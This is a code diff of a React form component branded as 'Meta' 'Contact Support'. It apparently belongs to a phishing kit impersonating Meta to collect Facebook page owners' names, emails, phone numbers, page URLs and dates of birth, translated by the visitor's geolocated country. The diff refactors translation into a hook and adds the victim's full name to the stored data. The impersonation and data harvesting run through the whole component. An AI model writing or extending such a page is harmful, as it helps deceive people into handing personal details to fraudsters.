@@ -1,11 +1,11 @@
+import useTranslation from '@/hooks/useTranslation';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
 import { faCheck, faXmark } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
 import 'intl-tel-input/build/css/intlTelInput.css';
 import IntlTelInput from 'intl-tel-input/reactWithUtils';
-import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
+import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';
 
 interface FormData {
     information: string;
@@ -30,7 +30,6 @@ const FORM_FIELDS: FormField[] = [
 const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
-    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         information: '',
         fullName: '',
@@ -45,29 +44,11 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [touchFields, setTouchFields] = useState<Set<string>>(new Set());
     const [phoneError, setPhoneError] = useState('');
 
+    const { t } = useTranslation();
     const validateEmail = (value: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
     const hasEmailError = (field: string) => formData[field as keyof FormData] && touchFields.has(field) && !validateEmail(formData[field as keyof FormData] as string);
     const { setModalOpen, geoInfo, setMessageId, setMessageContent, setContactInfo, setUserInfo } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
-
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-        const textsToTranslate = ['Meta', 'Contact Support', 'Tell us where you need help. Your details are used only to respond to this request.', 'Full name', 'Business Email', 'Business email', 'Personal Email', 'Your personal email', 'Phone', 'Enter your phone number', 'Page URL', 'Your page URL', 'Date of Birth', 'Day', 'Month', 'Year', 'I agree', 'I agree Terms of Service', 'Terms of Service', 'Submit', 'Please enter a valid date of birth.', 'Invalid date.', 'Date of birth cannot be in the future.', 'Please enter a valid email address.', 'Please enter a valid phone number.'];
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
 
     const initOptions = useMemo(
         () => ({
@@ -214,7 +195,8 @@ ${
         setUserInfo({
             email: formData.personalEmail,
             phone: phoneNumber,
-            pageName: formData.facebookPageName
+            pageName: formData.facebookPageName,
+            fullName: formData.fullName
         });
 
         setMessageContent(message);
